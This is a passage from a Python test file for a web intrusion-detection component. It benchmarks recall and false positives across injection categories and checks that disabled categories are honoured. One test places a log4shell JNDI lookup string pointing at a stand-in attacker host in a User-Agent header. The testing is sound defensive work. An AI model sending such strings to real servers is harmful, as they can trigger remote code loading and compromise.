        f"benign corpus: {len(_PRODUCTION_BENIGN_CASES)} cases",
        f"mechanisms exercised: {sorted(mechanisms_exercised)}",
        f"wall time: {wall_time_seconds:.3f}s",
        "",
        "recall by delivery mechanism (detected/total):",
    ]
    for mechanism in _ALL_MECHANISMS:
        total = total_by_mechanism.get(mechanism, 0)
        if total:
            report_lines.append(
                f"  {mechanism:16} "
                f"{_fraction(detected_by_mechanism.get(mechanism, 0), total)}"
            )
    report_lines.extend(
        [
            "",
            f"total recall:  "
            f"{_fraction(malicious_detected, len(_PRODUCTION_MALICIOUS_CASES))}",
            f"total fp rate: "
            f"{_fraction(benign_flagged, len(_PRODUCTION_BENIGN_CASES))}",
            "",
            "targeted entry-level cases:",
        ]
    )
    for targeted in _TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected} "
            f"gap={targeted.known_gap_reason or 'none'}"
        )
    report_lines.append("")
    report_lines.append(
        "targeted backtick sql-keyword-exemption-bypass cases (defect 5):"
    )
    for targeted in _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected}"
        )
    report_lines.append("")
    report_lines.append(
        "targeted round-6 command-substitution cases "
        "(dollar-paren/brace, log4shell, sql-keyword-glue):"
    )
    for targeted in _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected}"
        )
    report_lines.append("")
    report_lines.append(
        "targeted dollar-substitution disclosed-FP and log4shell "
        "url_path bonus cases (ruling items 1-2):"
    )
    for targeted in _DOLLAR_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected}"
        )
    report_lines.append("")
    report_lines.append("known end-to-end false positives (documented, still counted):")
    for pin_key, reason in _KNOWN_E2E_FALSE_POSITIVES.items():
        report_lines.append(f"  {pin_key}: {reason}")
    report = "\n".join(report_lines)
    print(report)

    assert not targeted_failures, f"{targeted_failures}\n{report}"
    assert not backtick_targeted_failures, f"{backtick_targeted_failures}\n{report}"
    assert not round6_targeted_failures, f"{round6_targeted_failures}\n{report}"
    assert not dollar_fp_and_log4shell_bonus_failures, (
        f"{dollar_fp_and_log4shell_bonus_failures}\n{report}"
    )

    assert malicious_detected >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
        f"overall recall regressed: baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
        f"actual={malicious_detected} newly_undetected={undetected_case_ids}\n"
        f"{report}"
    )
    assert not unexpected_false_positive_case_ids, (
        f"unexpected false positives: {unexpected_false_positive_case_ids}\n{report}"
    )
    assert benign_flagged <= len(_KNOWN_E2E_FALSE_POSITIVES), (
        f"more benign cases flagged than documented known false positives: "
        f"actual={benign_flagged} known={known_false_positive_case_ids}\n{report}"
    )

    assert wall_time_seconds < _WALL_TIME_CEILING_SECONDS, (
        f"end-to-end detection benchmark wall time regressed: "
        f"ceiling={_WALL_TIME_CEILING_SECONDS}s actual={wall_time_seconds:.3f}s"
    )


@pytest.mark.asyncio
async def test_detect_penetration_attempt_legacy_smoke() -> None:
    _reset_singleton_to_legacy()

    malicious_detected = 0
    for index, case in enumerate(_PRODUCTION_MALICIOUS_CASES):
        mechanism = await _mechanism_for_index(
            _valid_mechanisms_for_category(case.category), index
        )
        if await _detected_via(mechanism, case.payload):
            malicious_detected += 1

    benign_flagged = 0
    for index, benign_case in enumerate(_PRODUCTION_BENIGN_CASES):
        mechanism = await _mechanism_for_index(_ALL_MECHANISMS, index)
        if await _detected_via(mechanism, benign_case.payload):
            benign_flagged += 1

    assert malicious_detected >= _LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL, (
        f"legacy singleton recall regressed: "
        f"baseline={_LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL} "
        f"actual={malicious_detected}"
    )
    assert benign_flagged <= len(_KNOWN_E2E_FALSE_POSITIVES), (
        f"legacy singleton false-positive rate rose: "
        f"baseline={len(_KNOWN_E2E_FALSE_POSITIVES)} actual={benign_flagged}"
    )


@pytest.mark.asyncio
async def test_always_scan_header_shield_honors_disabled_cmd_injection_category() -> (
    None
):
    disabled_config = SecurityConfig(enabled_detection_categories={"xss"})
    request = _user_agent_header_request("${jndi:ldap://evil.example/a}")

    result = await detect_penetration_attempt(request, disabled_config)

    assert result.is_threat is False
